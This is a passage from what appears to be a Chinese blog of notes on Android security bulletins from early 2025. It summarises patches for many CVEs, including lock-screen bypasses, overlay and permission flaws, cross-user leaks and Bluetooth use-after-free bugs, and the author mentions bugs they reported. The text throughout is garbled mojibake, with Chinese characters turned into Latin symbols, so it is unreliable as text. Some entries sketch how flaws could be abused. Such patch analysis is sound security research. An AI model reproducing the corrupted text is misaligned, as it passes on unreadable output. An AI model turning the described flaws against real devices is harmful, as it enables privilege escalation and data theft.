mapï¼Œè€Œä»ä»£ç ä¸Šæ¥çœ‹å¤±å»å¼•ç”¨çš„ LazyValue å¹¶ä¸ä¼šæ“ä½œ parcelï¼Œæ‰€ä»¥æˆ‘çŒœæµ‹æƒ³å®é™…è§¦å‘è¿™ä¸ªæ¼æ´éœ€è¦ä¸€ä¸ªå¹¶é BadParcelableException ä½†åœ¨ä¸Šå±‚è¢« catch çš„å¼‚å¸¸æ‰èƒ½è®© LazyValue é©»ç•™åœ¨ map é‡Œï¼Ÿç±»ä¼¼ä¹‹å‰çš„ leak valueï¼Œä½†åœ¨æ²¡æœ‰å¦ä¸€ä¸ªèƒ½å€’é€€ parcel position çš„æ¼æ´çš„æƒ…å†µä¸‹æ˜¯å¦èƒ½åƒä¹‹å‰é‚£æ ·åˆ©ç”¨ï¼Ÿä»æ¼æ´æè¿°ä¸Šæ¥çœ‹åº”è¯¥æ˜¯åšåˆ°äº†ä»£ç æ‰§è¡Œçš„CVE-2025-22416 EoP HighChooserActivity é¢„è§ˆ ChooserTarget çš„ icon æ—¶å…ˆæ£€æŸ¥æ˜¯å¦æœ‰æƒé™è¯»å– uriã€‚CVE-2025-22417 EoP HighWindowManager transaction è¿‡ç¨‹ä¸­çš„ race conditionï¼Œçœ‹çš„ä¸æ˜¯å¾ˆæ˜ç™½ã€‚æ¼æ´æè¿°ï¼šIn finishTransition of Transition.java, there is a possible way to bypass touch filtering restrictions due to a tapjacking/overlay attack. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.CVE-2025-22422 EoP HighSystem UI å¤„ç† authentication prompt æ—¶çš„é€»è¾‘ bugï¼Œå½“ top app å’Œ client app ä¸ä¸€æ ·æ—¶è¯´æ˜å¯èƒ½çœŸæ­£è¯·æ±‚éªŒè¯çš„ app å·²ç»è¢«æ¶æ„ app é¡¶åˆ°äº†åå°ï¼Œç”¨æˆ·çœ‹è§çš„å¯èƒ½æ˜¯æ¶æ„ app æ˜¾ç¤ºçš„å†…å®¹ï¼ˆç±»ä¼¼ task hijackingï¼‰ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦å‘ŠçŸ¥åŸæ¥çš„ client éªŒè¯å¤±è´¥ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨äº† createConfirmDeviceCredentialIntent ï¼ˆä¼š resolve åˆ° settings çš„ ConfirmDeviceCredentialActivityï¼‰è€Œéæ‰‹åŠ¨è°ƒç”¨ BiometricPrompt è¿›è¡ŒéªŒè¯çš„æƒ…å†µï¼Œæ­¤æ—¶ç›´æ¥å‘èµ·éªŒè¯æµç¨‹çš„ client package æ˜¯ settingsï¼Œå³ä½¿åç»­ top activity å˜æˆäº† settings çš„å…¶ä»– activitiyï¼Œè¿™ä¸ªåˆ¤æ–­ä¹Ÿä¼šè®¤ä¸º top app å¹¶æ²¡æœ‰æ”¹å˜ä»è€Œä¸ä¼šå–æ¶ˆéªŒè¯è¯·æ±‚ã€‚åˆ©ç”¨è¿™ä¸ª bug åº”è¯¥éœ€è¦èƒ½æ‰¾åˆ°è¶³å¤Ÿå…·æœ‰è¿·æƒ‘æ€§çš„ activity æ‰€ä»¥åº”è¯¥è¿˜æŒºéº»çƒ¦çš„ï¼Ÿè¡¥ä¸åŠ äº†ä¸€ä¸ª top activity çš„ class name æ£€æŸ¥ã€‚ç›¸å…³å¼•ç”¨ï¼šCVE-2020-27059CVE-2025-22424 EoP HighCVE-2025-22426 EoP Highpm ComputerEngine resolveContentProvider åŒæ—¶æ¥æ”¶ uri çš„ authority å’Œ user idï¼Œä½†è°ƒç”¨è€…å¯èƒ½ä¼šæŠŠ user id å­˜å‚¨åœ¨ authority å†…ï¼Œè¦æŠŠè¿™ä¸ª user id æå–å‡ºæ¥ã€‚ä¸å¤ªæ¸…æ¥šå…·ä½“æ˜¯å“ªé‡Œå¯èƒ½ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„CVE-2025-22434 EoP Highç”¨æˆ·ç‚¹å‡»é”®ç›˜ä¸Šæ‰“å¼€ç³»ç»Ÿè®¾ç½®çš„å¿«æ·é”®æ—¶æ²¡æœ‰æ£€æŸ¥æ˜¯å¦æœ‰é”å±å°±ç›´æ¥æ‰“å¼€äº†è®¾ç½® appï¼Œé€ æˆé”å±ç»•è¿‡ã€‚CVE-2025-22437 EoP Highæ³¨æ„å®˜æ–¹å…¬å‘Šæ”¾é”™äº†è¡¥ä¸ï¼ï¼å®˜æ–¹å…¬å‘Šé‡Œæ”¾çš„è¡¥ä¸å’Œ CVE-2024-49728 ä¸€è‡´ï¼Œä½†æ˜¯æ­£ç¡®çš„è¡¥ä¸å…¶å®æ˜¯ https://android.googlesource.com/platform/frameworks/base/+/25d6165d462ad8fe83ea8dd254214a420bc1a526å…¶å®è¿™ä¸ªæ¼æ´å’Œ 2023 å¹´ 11 æœˆå…¬å‘Š CVE-2023-40111 æ˜¯ä¸€æ ·çš„ï¼Œå½“æ—¶å¯èƒ½ç”±äºå…¼å®¹æ€§è€ƒè™‘åªç»™ android 14 ä¸Šäº†è¿™ä¸ª patchï¼Œç°åœ¨å¯èƒ½æ˜¯è§‰å¾—ä¸å¦¥å½“åˆç»™ backport åˆ°äº† 13ã€‚CVE-2025-22438 EoP Highinput dispatcher é‡Œçš„åŠ é”é—®é¢˜ï¼Œä¼šå¯¼è‡´ dispatchEntry è¿™ä¸ªå˜é‡ UAFCVE-2025-22442 EoP Highwork profile é»˜è®¤ç¦ç”¨å¼€å‘è€…é€‰é¡¹ï¼Œçœ‹æ¼æ´æè¿°æ˜¯èƒ½å¾€ profile é‡Œè£… appCVE-2024-49722 ID Highåœ¨ç³»ç»Ÿè®¾ç½®é‡Œæ›´æ¢ç”¨æˆ·å¤´åƒçš„æ—¶å€™ä½¿ç”¨æ˜¾å¼ intent è¿›è¡Œå›¾ç‰‡é€‰æ‹©ï¼Œç¡®ä¿åªå¯åŠ¨ç³»ç»Ÿè‡ªå·±çš„å¤´åƒé€‰æ‹©å™¨ã€‚ï¼ˆè¿™ä¸ªé—®é¢˜ååå¤å¤ä¿®å¤å‡ éæ€ä¹ˆåˆæ¥äº†ï¼Ÿä¹‹å‰æµ‹è¯•è¿‡è¿™é‡Œæ²¡èƒ½æµ‹å‡ºä»€ä¹ˆé—®é¢˜ï¼Œè¿™æ¬¡åªç»™ 15 æ›´æ–°äº†ï¼Œå¯èƒ½æ˜¯æ–°ç‰ˆæœ¬åˆåŠ äº†ä»€ä¹ˆä¸œè¥¿ï¼‰CVE-2025-22421 ID Highé€šçŸ¥çš„ content description ï¼ˆç”¨äºæ— éšœç¢ï¼‰é‡Œä¸è¦åŒ…å«é€šçŸ¥å†…å®¹ï¼Œå¦åˆ™å¯èƒ½ä¼šè¢«è¯»å±è½¯ä»¶åœ¨æ²¡è§£é”å±å¹•çš„æ—¶å€™å°±è¯»å‡ºæ¥CVE-2025-22430 ID HighTrustManager æ–°å¢çš„ isInSignificantPlace æ–¹æ³•éœ€è¦ ACCESS_FINE_LOCATION æƒé™ã€‚åªå½±å“ 15CVE-2025-22431 DoS HighAppOpsService å†…å³ä½¿ç›´æ¥è°ƒç”¨è€…å¯ä¿¡ä¹Ÿä¸åº”è¯¥ç›´æ¥ä¿¡ä»»ç”± proxy app æä¾›çš„ proxied attribution tagï¼Œæ”¹ä¸ºåªåœ¨æ²¡æœ‰ proxy app æˆ–å…¶æ˜¯ç³»ç»Ÿ app æ—¶æ‰ä¿¡ä»»SystemCVE-2025-26416 EoP Criticalskia è§£ç  bmp å›¾ç‰‡æ—¶çš„æœªåˆå§‹åŒ–å˜é‡CVE-2025-22423 DoS Criticaldng_sdk é‡Œå¦‚æœ tag count éæ³•åˆ™æå‰è¿”å›ï¼Œé¿å…åç»­å´©æºƒCVE-2024-40653 EoP HighTelecomm é‡Œå¦‚æœç»‘å®šåˆ° ConnectionService å 15 ç§’è¿˜æ²¡æœ‰å“åº”å°±è§£ç»‘CVE-2024-49720 EoP Highé€šè¿‡ role æˆäºˆæƒé™æ—¶æŠŠç”¨æˆ·ä¹‹å‰å¯¹è¯¥æƒé™é€‰æ‹©çš„â€œæ¯æ¬¡éƒ½è¯¢é—®â€è§†ä¸ºæœ‰æ•ˆçš„ç”¨æˆ·å†³å®šï¼Œä¸è¦å»è¦†ç›–å®ƒCVE-2024-49730 EoP Highfuse daemon å†…å¢å¤§ MAX_READ_SIZEï¼Œçœ‹æè¿°æ˜¯ oob writeCVE-2025-22418 EoP Highç³»ç»Ÿè®¾ç½®å†…é€‰æ‹©é“ƒå£°çš„ intent æŒ‡å®šåŒ…åï¼Œæ€€ç–‘è·Ÿä¹‹å‰é‚£å †é“ƒå£°æ¼æ´ï¼ˆCVE-2023-40108ã€CVE-2023-40132ï¼‰æ˜¯ä¸€æ ·çš„CVE-2025-22419 EoP Hightelephony app å¤šä¸ª activity æ·»åŠ  flag é˜²æ­¢è¢«æ‚¬æµ®çª—è¦†ç›–ã€‚CVE-2025-22427 EoP Highsettings NotificationAccessConfirmationActivity é”™è¯¯åœ°å°† SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS ä¼ é€’ç»™ addFlags ï¼ˆä½œä¸ºä¸€ä¸ª system flag åº”è¯¥ä½¿ç”¨ addSystemFlags/addPrivateFlagsï¼‰ï¼Œå¯¼è‡´å…¶è¢«é”™è¯¯è§£é‡Šä¸ºäº† FLAG_SHOW_WHEN_LOCKED ä»è€Œæ˜¾ç¤ºåœ¨äº†é”å±ä¹‹ä¸Šï¼Œä¸è§£é”å°±å¯ä»¥æˆæƒã€‚CVE-2025-22428 EoP Highåœ¨æˆ‘ä¹‹å‰é‚£ä¸ª CVE-2024-43088 çš„è¡¥ä¸åŸºç¡€ä¹‹ä¸ŠæŠŠæ£€æŸ¥ calling package çš„æƒé™æ›´æ¢ä¸ºäº†æ£€æŸ¥ calling uid çš„æƒé™ã€‚ä¸æ˜¯å¾ˆæ‡‚ï¼ŒçŒœæµ‹æ˜¯å¯èƒ½æœ‰ä¸€ä¸ª app åœ¨ä¸»ç”¨æˆ·ä¸Šæœ‰è·¨ç”¨æˆ·æƒé™ä½†åœ¨æ¬¡ç”¨æˆ·ä¸Šæ²¡æƒé™çš„æƒ…å†µï¼ŸCVE-2025-22432 EoP Highæ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚telecomm å†…ä½¿ç”¨äº† BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS æ¥ bind CallRedirectionSeviceï¼ˆå…¶æ˜¯ BAL è±å…åå•ä¹‹ä¸€ï¼‰ï¼Œæ‰€ä»¥å“åº”è¶…æ—¶äº†ä¹Ÿéœ€è¦ unbindï¼Œå¦åˆ™ä¼šå¯¼è‡´ BAL bypassã€‚æ›´å¤šå†…å®¹å¯è§äº https://wrlus.com/android-security/bindservice-error-handle/CVE-2025-22433 EoP HighIntentForwarderActivity å†…æ£€æŸ¥ intent æ˜¯å¦å¯ä»¥è¢«è½¬å‘åˆ°å…¶ä»– profile æ—¶çš„é€»è¾‘ bugï¼Œå¦‚æœ intent æœ‰ selector é‚£è¿™ä¸ª intent æœ¬èº«å’Œ selector éƒ½è¦è¢«æ£€æŸ¥ã€‚CVE-2025-22435 EoP Highè“ç‰™ AVDT åè®®å®ç°é‡Œå¢åŠ äº†ä¸€ä¸ªæ¶ˆæ¯ç±»å‹æ£€æŸ¥ï¼Œé˜²æ­¢å¯èƒ½çš„ç±»å‹æ··æ·†CVE-2025-22439 EoP HighDocumentUI åŠ è½½ last accessed stack è®°å½•çš„ uri æ—¶å¿˜è®°æ ¡éªŒ uriï¼Œå¯ä»¥ç»•è¿‡å­˜å‚¨é™åˆ¶æˆæƒCVE-2024-49728 ID Highé€šè¿‡è“ç‰™å‘é€æ–‡ä»¶æ—¶æ£€æŸ¥ä¼ é€’çš„ uri æ˜¯å¦ä¸ºæŒ‡å‘å…¶ä»–ç”¨æˆ·çš„ uriã€‚å°è±¡ä¸­å¾ˆä¹…ä»¥å‰æˆ‘æ˜¯æµ‹è¯•è¿‡è¿™é‡Œçš„ï¼Œæ²¡åˆ©ç”¨æˆåŠŸï¼Œä¸çŸ¥é“å’‹å¤ç°çš„2025-03-01åœ¨é‡åˆ©ç”¨æ¼æ´ï¼šCVE-2024-43093ã€ CVE-2024-50302æ‡’å¾—æ”¾è¡¥ä¸é“¾æ¥äº†ï¼Œè‡ªå·±å»å®˜æ–¹å…¬å‘Šé‡Œé¢æ‰¾å§FrameworkCVE-2024-0032 EoP Highå»å¹´2æœˆè¡¥ä¸é‡Œæ”¾è¿‡çš„ï¼Œé™åˆ¶é€šè¿‡ SAF è®¿é—® /sdcard/Android/dataã€‚ä¸çŸ¥é“ä¸ºå•¥é‡æ–°æ”¾äº†ä¸€éã€‚CVE-2024-43093 EoP Highè·Ÿå»å¹´11æœˆè¡¥ä¸çš„ä¸€æ ·ï¼Œè‡ªå·±å»çœ‹å»å¹´çš„åˆ†æå§ï¼Œæ‡’å¾—å†å†™ä¸€éäº†ã€‚å»å¹´å¿˜äº†ç»™ 12L æ›´æ–°ï¼Œé‡æ–°æ”¾ä¸€éã€‚CVE-2025-0078 EoP Highservice manager æ³¨å†Œè‡ªå·±çš„æ—¶å€™éœ€è¦æ‰“å¼€ requesting sid ä»è€Œå¯ä»¥æ­£ç¡®æ£€ç´¢ caller çš„ selinux contextã€‚å…³äº requesting sid çš„æ›´å¤šä¿¡æ¯è§ https://project-zero.issues.chromium.org/issues/42450815 ï¼ˆCVE-2019-2023 åŠç›¸å…³çš„ä¸€ç³»åˆ—æ¼æ´ï¼‰CVE-2025-0080 EoP HighPackageInstaller unarchive app çš„å¯¹è¯æ¡†æ·»åŠ  flag é˜²æ­¢è¢« overlayã€‚CVE-2024-43090 ID Highæ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚å»å¹´11æœˆæ”¾è¿‡çš„ï¼Œsystemui é‡Œé¢çš„ icon è·¨ç”¨æˆ·æ³„éœ²ï¼Œå½“æ—¶åœ¨ Android 15 ä¸Šå¿˜äº†å¯ç”¨ç›¸å…³ flag å¯¼è‡´è¡¥ä¸æ²¡ç”Ÿæ•ˆï¼Œæ‰€ä»¥é‡æ–°æ”¾ä¸€éCVE-2025-0083 ID Hightelecom å†…ä½¿ç”¨ getAuthority() ç„¶åæ‰‹åŠ¨è§£æ @ å­—ç¬¦å‰é¢çš„å†…å®¹å»è·å– uri å†…çš„ user id è€Œéä½¿ç”¨ getEncodedUserInfoã€‚ä» commit message å†…å¤§æ¦‚å¯ä»¥çŒœæµ‹æ˜¯æŠŠ @ å­—ç¬¦ä½¿ç”¨ uri encode çš„æ ¼å¼æ¥ç»•è¿‡åŸæ¥çš„è¡¥ä¸ã€‚CVE-2025-0086 ID HighAccountManagerService getAuthToken æ ¡éªŒ Authenticator è¿”å›çš„ account typeï¼Œé¿å…è¯»åˆ°å…¶ä»– account æ•°æ®ã€‚CVE-2024-49740 DoS Hightelephony é™åˆ¶ VisualVoicemailSmsFilterSettings å¿…é¡»ç”±é»˜è®¤æ‹¨å· app è®¾ç½®ï¼ŒåŒæ—¶é™åˆ¶å…¶å†…å®¹çš„å¤§å°Systemä¸‹é¢æœ‰å¾ˆå¤šä¸€ä¸ªè¡¥ä¸é“¾æ¥å¯¹åº”å¤šä¸ªæ¼æ´çš„æƒ…å†µï¼Œä¸ä¸€ä¸€å¤åˆ¶ç²˜è´´äº†ï¼Œçœ‹å¾—æ˜ç™½å°±è¡ŒCVE-2025-0074 RCE CriticalCVE-2025-22403 RCE Criticalbluetooth sdp sdp_discovery.cc å†…ä¸¤å¤„å‡ºé”™ log é‡Œä½¿ç”¨äº†å¯èƒ½å·²ç»è¢«é‡Šæ”¾æ‰çš„æŒ‡é’ˆï¼Œé€ æˆ UAFã€‚çœŸçš„èƒ½é€ æˆ RCEï¼Ÿæˆ‘æŒæ€€ç–‘æ€åº¦ã€‚åªå½±å“ 15ã€‚CVE-2025-0075 RCE Criticalsdp_server.cc log è¯­å¥å†…çš„ UAFï¼Œè·Ÿä¸Šé¢ä¸€æ ·ã€‚åªå½±å“ 15ã€‚CVE-2025-0084 RCE Criticalè“ç‰™ SDP åè®®å®ç°ä¸­ï¼ŒåŒä¸€ä¸ªå®¢æˆ·ç«¯å‘èµ·å¤šä¸ªè¿æ¥å¯èƒ½å¯¼è‡´ UAFCVE-2025-22408 RCE CriticalCVE-2025-22410 RCE CriticalCVE-2025-22411 RCE CriticalCVE-2025-22412 RCE CriticalCVE-2025-22409 EoP CriticalCVE-2025-22404 EoP HighCVE-2025-22405 EoP HighCVE-2025-22406 EoP HighCVE-2025-22407 ID Highè·Ÿä¸Šé¢ä¸€å †æ˜¯ç±»ä¼¼é—®é¢˜ï¼Œè“ç‰™ log å†…å¯èƒ½ä½¿ç”¨å·²ç»è¢«é‡Šæ”¾çš„å˜é‡å¯¼è‡´ UAFã€‚çœŸçš„æœ‰å¿…è¦æè¿™ä¹ˆå¤š CVEï¼Ÿåªå½±å“ 15ã€‚CVE-2025-0081 DoS Criticalè§£æ jpeg æ—¶å¦‚æœå“ˆå¤«æ›¼è¡¨ä¸ºç©ºç›´æ¥ abortCVE-2023-21125 EoP Highè“ç‰™ btif/src/btif_hh.cc å†…çš„ UAF é—®é¢˜CVE-2025-0079 EoP Highè“ç‰™ AVCTP/AVDTP æŒ‡å®š BTA_SEC_ENCRYPT ä¿è¯åŠ å¯†ä¼ è¾“CVE-2025-0082 ID Highè¡¥ä¸è·Ÿä¸Šé¢çš„ CVE-2025-0083 æ˜¯ä¸€æ ·çš„ã€‚CVE-2025-0092 ID HighCVE-2025-0093 ID Highè“ç‰™è®¾å¤‡è§£é™¤ç»‘å®šæ—¶é‡ç½®çŸ­ä¿¡ã€é€šè®¯å½•ã€SIM æƒé™æˆæƒçŠ¶æ€CVE-2025-26417 ID Highå°†å·²ç»ä¸‹è½½å¥½çš„æ–‡ä»¶æ’å…¥è¿› DownloadProvider ï¼ˆDownloadManager.addCompletedDownloadï¼‰æ—¶ï¼Œç¡®ä¿è·¯å¾„å¯¹åº”æ–‡ä»¶çš„æ‰€æœ‰è€…ä¸è°ƒç”¨è€…åŒ¹é…ï¼Œå¦åˆ™æ¶æ„åº”ç”¨å¯ä»¥é€šè¿‡æ’å…¥æ“ä½œäº§ç”Ÿçš„ DownloadProvider çš„ id é€šè¿‡ DownloadProvider çš„æƒé™è®¿é—®è¯¥æ–‡ä»¶2025-02-01å¯èƒ½çš„è¢«åœ¨é‡åˆ©ç”¨æ¼æ´ï¼šCVE-2024-53104ï¼Œå†…æ ¸ä¸­ USB æ¨¡å—çš„è¶Šç•Œå†™å…¥FrameworkCVE-2024-49721 EoP High 1è§ CVE-2024-49721 InputMethodSubtypeArray ååºåˆ—åŒ–æ¼æ´åˆ†æCVE-2024-49743 EoP High 1 2 3è¿™ä¸ªæ¼æ´æ¯”è¾ƒå¤æ‚ï¼Œåç»­ä¼šå•ç‹¬å‘æ–‡ç« è§£æï¼Œæ•¬è¯·æœŸå¾…CVE-2024-49746 EoP High 1 2Parcel::continueWrite ä¸­çš„ fd å¤„ç†é—®é¢˜ï¼Œçœ‹èµ·æ¥æ˜¯ä¼šé”™è¯¯ close æ‰ä¸è¯¥è¢«å…³é—­çš„ fdï¼Ÿè¿˜åŠ äº†å¾ˆå¤šæº¢å‡ºçš„æ£€æŸ¥CVE-2025-0097 EoP High 1WindowManagerService transferTouchGesture ä¸­é™¤äº†æ ¡éªŒ token è¿˜éœ€è¦æ ¡éªŒ calling uid è·Ÿ owner uid ç›¸ç­‰ã€‚åªå½±å“ 15CVE-2025-0098 EoP High 1TaskFragmentOrganizerController å†…ä¼šæ£€æŸ¥ activity çš„ pid ä¸æ³¨å†Œ organizer çš„æ—¶å€™çš„ calling pid æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœä¸ç›¸ç­‰è¯´æ˜ä¸æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™ä¸å‘é€ activity token ä»¥é¿å…å®ƒæ³„éœ²ã€‚ä½†æ˜¯è¿™ä¸ªæ£€æŸ¥å­˜åœ¨ç¼ºé™·ï¼Œå› ä¸ºå¦‚æœ app è¿›è¡Œ binder transact çš„æ—¶å€™æŒ‡å®šäº† FLAG_ONEWAYï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥è°ƒç”¨ï¼Œè¿™ä¸ªæ—¶å€™è¢«è°ƒç”¨è€…æ‹¿åˆ°çš„ calling pid ä¼šæ˜¯ 0ï¼Œä»¥æ­¤å¯ä»¥æ³„éœ²å‡º pid æ˜¯ 0 çš„ ActivityRecord çš„ tokenã€‚ä»€ä¹ˆæ—¶å€™ ActivityRecord çš„ pid æ˜¯ 0ï¼Ÿæ€€ç–‘æ˜¯ activity æ‰€å±çš„è¿›ç¨‹å·²ç»é€€å‡ºäº†çš„æ—¶å€™ã€‚åªå½±å“ 15ã€‚CVE-2025-0099 EoP High 1CompanionDeviceManagerService æ–°å¢çš„ getBackupPayload å’Œ applyRestoredPayload è¿™ä¸¤ä¸ªå‡½æ•°æ²¡æœ‰æƒé™æ£€æŸ¥ï¼Œåº”è¯¥åŠ ä¸Š uid æ ¡éªŒï¼Œåªå…è®¸ system èº«ä»½è°ƒç”¨ã€‚CVE-2023-40133 ID HighCVE-2024-0037 ID High1æ£€æŸ¥ Autofill ç›¸å…³çš„ Slice ä¸­çš„ Icon URI æ˜¯å¦å±äºå½“å‰ç”¨æˆ·ï¼Œé¿å…è·¨ç”¨æˆ·æ³„æ¼ã€‚è¿™ä¸ªåº”è¯¥æ˜¯å»å¹´å°±æ”¾è¿‡ä¸€æ¬¡ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæ”¾äº†ä¸€éCVE-2023-40134 ID HighCVE-2023-40135 ID HighCVE-2023-40136 ID HighCVE-2023-40137 ID HighCVE-2023-40138 ID HighCVE-2023-40139 ID High1æ£€æŸ¥ Autofill ç›¸å…³ RemoteViews ä¸­ URI æ˜¯å¦å…¨éƒ¨å±äºå½“å‰ç”¨æˆ·ï¼Œé¿å…è·¨ç”¨æˆ·æ³„æ¼ã€‚è¿™ä¸ªå»å¹´ä¹Ÿæ”¾è¿‡ä¸€æ¬¡ï¼ŒåŒæ ·æä¸æ‡‚ä¸ºä»€ä¹ˆåˆæ”¾CVE-2025-0100 ID High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚SystemUI MediaProjectionPermissionActivity ä½¿ç”¨ getCallingPackage è·å–è°ƒç”¨è€…ç„¶åæ ¡éªŒå…¶æƒé™ï¼Œå¦‚æœæ˜¯ç‰¹æƒåº”ç”¨å°±è·³è¿‡ç¡®è®¤ç¯èŠ‚ã€‚ä½†æ˜¯ getCallingPackage çš„è¿”å›ç»“æœå®é™…ä¸Šå¯ä»¥è¢«ä¼ªé€ ï¼Œè¡¥ä¸æ”¹æˆäº†æ›´å‡†ç¡®çš„ getLaunchedFromPackageã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå¥½ç©çš„ç‚¹ï¼Œå°±æ˜¯ getCallingPackage è¿”å›çš„æ˜¯å“ªä¸ª app ä¼šæ”¶åˆ°å½“å‰ Activity è¿”å›çš„ç»“æœï¼Œæ‰€ä»¥å¯ä»¥è¢«ä¼ªé€ ï¼Œä½†æ˜¯ SystemUI éœ€è¦æŠŠ IMediaProjection è¿”å›ç»™è°ƒç”¨è€…ç„¶åè°ƒç”¨è€…æ‰èƒ½ä½¿ç”¨å®ƒå¼€å§‹å½•å±ï¼Œä¼ªé€  getCallingPackage å®é™…ä¸Šä¼šå¯¼è‡´åº”ç”¨æ”¶ä¸åˆ°è¿”å›çš„ binder è‡ªç„¶ä¹Ÿå°±æ— æ³•å®Œæˆåç»­åˆ©ç”¨ã€‚é‚£ä¹ˆè¿™ä¸ªçœ‹èµ·æ¥è§¦å‘æ¡ä»¶å’Œå¯ç”¨æ€§ç›¸æ‚–çš„æ¼æ´æ˜¯æ€ä¹ˆè¢«åˆ©ç”¨çš„å‘¢ï¼Ÿè¿™é‡Œå…ˆå–ä¸ªå…³å­ï¼Œè¯»è€…å¯ä»¥å…ˆè‡ªå·±æ€è€ƒæ€è€ƒã€‚CVE-2024-49741 DoS High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚AppWidgetServiceImpl ä¸­é™åˆ¶ä¸€ä¸ªåº”ç”¨æœ€å¤šå¯ä»¥åˆ›å»º 20 ä¸ª hostï¼Œæ¯ä¸ª host å¯ä»¥æ‹¥æœ‰ 200 ä¸ª widgetï¼Œè¿™ä¸ªè¡¥ä¸ä¹‹å‰æ˜¯å®Œå…¨æ²¡æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥å¯èƒ½å‘ç”Ÿè¶…å¤§æ•°æ®é‡å¯¼è‡´ DoSã€‚PlatformCVE-2025-0094 EoP High 1ç¦æ­¢ work profile æ‰“å¼€å¤šç”¨æˆ·ç®¡ç†é¡µé¢ï¼Œçœ‹æ¼æ´æè¿°æ˜¯å¯ä»¥ç§»é™¤ work profileï¼ŸSystemCVE-2025-0091 EoP High 1åœ¨ Settings åº”ç”¨ä¸­çš„è´¦å·ç®¡ç†é¡µé¢é‡Œï¼Œç¦æ­¢å¯åŠ¨å¸¦æœ‰ content URI çš„ intentã€‚è·Ÿ Self-changing Data Type - CVE-2024-40676 æ¼æ´åˆ†æ æ˜¯åŒä¸€ç±»æ¼æ´ï¼Œå»å¹´é‚£ç¯‡æ–‡ç« ä¸€ç›´æ²¡å‘å°±æ˜¯ä¸ºäº†ç­‰è¿™ä¸ªæ¼æ´å®¡æ ¸ï¼Œå¯æƒœ duplicate äº† ğŸ˜­CVE-2025-0095 EoP High 1Settings AppTimeSpentPreference ä¸­ä½¿ç”¨ä¸€ä¸ªåªæœ‰ Action çš„éšå¼ Intent å¯åŠ¨ Activityï¼Œå¯èƒ½ä¼šè¢«æ¶æ„åº”ç”¨åŠ«æŒã€‚è¡¥ä¸ç»™è¿™ä¸ª intent åŠ ä¸Šäº† setPackageã€‚CVE-2025-0096 EoP High 1nfc æ¨¡å—é‡Œé¢æœ‰ä¸ª malloc çš„ size å†™å°äº†ï¼Œåªå½±å“ 15CVE-2024-49723 ID High 1 2ç§»é™¤ Conscrypt çš„ 3DES æ”¯æŒï¼Œåªç»™ 15 æ›´æ–°äº†CVE-2024-49729 ID High 1fs_mgr/libdm/dm.cpp ä¸­ redact æ‰å¯èƒ½çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦åˆ™ä¼šå¯¼è‡´å…¶åœ¨ bug report è¿‡ç¨‹ä¸­è¢« dump å‡ºæ¥ï¼Œæ³„æ¼åŸå§‹åŠ å¯†å¯†é’¥ã€‚2025-01-01è¿™ä¸ªæœˆè¡¥ä¸å¥½å¤šï¼Œç®—æ˜¯è§£ç­”äº†ä¸Šä¸ªæœˆçš„â€œä¸ºä»€ä¹ˆè¿™ä¹ˆå°‘â€çš„ç–‘é—®å¤§å®¶æ–°å¹´å¿«ä¹ï¼ä¸€ç›´åœ¨ç­‰è¡¥ä¸é“¾æ¥ï¼Œç­‰äº†ä¸€ä¸ªæœˆè¿˜æ²¡æ”¾ï¼Œåªèƒ½å…ˆå‘ä¸€ä¸ªä¸å®Œæ•´ç‰ˆçš„äº†æ³¨ï¼šæœ¬æœˆè¡¥ä¸é“¾æ¥æœªæ”¾å‡º ä»¥ä¸‹éƒ¨åˆ†è¡¥ä¸æ¥æºä¸ºæ‰‹åŠ¨è¿˜åŸ2025/02/24 æ›´æ–°ï¼šå®˜æ–¹å…¬å‘Šé‡Œå·²ç»æ”¾å‡ºè¡¥ä¸é“¾æ¥ å»ºè®®å»çœ‹å®˜æ–¹å…¬å‘Šé‡Œçš„ï¼›å®˜æ–¹å…¬å‘Šé‡Œç§»é™¤äº† CVE-2023-40108 CVE-2023-40132ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆFrameworkCVE-2024-49724 EoP High 1AccountManagerService checkKeyIntent åŠ äº†ä¸ª setComponent è®© intent å˜æˆæ˜¾å¼ intentï¼Œé˜²æ­¢ resolve åˆ° startActivity æœŸé—´æŸäº›å½±å“ intent resolve æµç¨‹çš„å› ç´ å‘ç”Ÿæ”¹å˜ï¼Œå¯¼è‡´ TOCTTOU race conditionã€‚å…·ä½“å®ä¾‹ï¼šSelf-changing Data Typeã€‚CVE-2024-49732 EoP High 1CompanionDeviceManagerService é‡Œæ–°å¢çš„ enablePermissionsSync disablePermissionsSync getPermissionSyncRequest ä¸‰ä¸ª API ç¼ºå°‘æƒé™æ£€æŸ¥ï¼Œè¡¥ä¸é™åˆ¶åªæœ‰ system uid å¯ä»¥è°ƒç”¨ã€‚åªå½±å“ 15ã€‚CVE-2024-49735 EoP High 1å­˜å‚¨ NotificationChannel çš„æ—¶å€™ï¼Œé™åˆ¶é™„å¸¦çš„ VibrationEffect çš„å¤§å°ã€‚CVE-2024-49737 EoP High 1è°ƒç”¨ startActivityInTaskFragment çš„æ—¶å€™å·²ç» clearCallingUid äº†ï¼Œä¹‹ååœ¨ AMS é‡Œæ„é€  SafeActivityOptions çš„æ—¶å€™ä¼šæ‹¿åˆ°è‡ªå·±çš„ uidï¼Œæ”¹æˆè°ƒç”¨çš„æ—¶å€™å°±ä¸»åŠ¨æŒ‰ç…§å·²ç»è®°å½•çš„ calling uid/pid æ„é€  SafeActivityOptions å†ä¼ è¿‡å»ã€‚åªå½±å“ 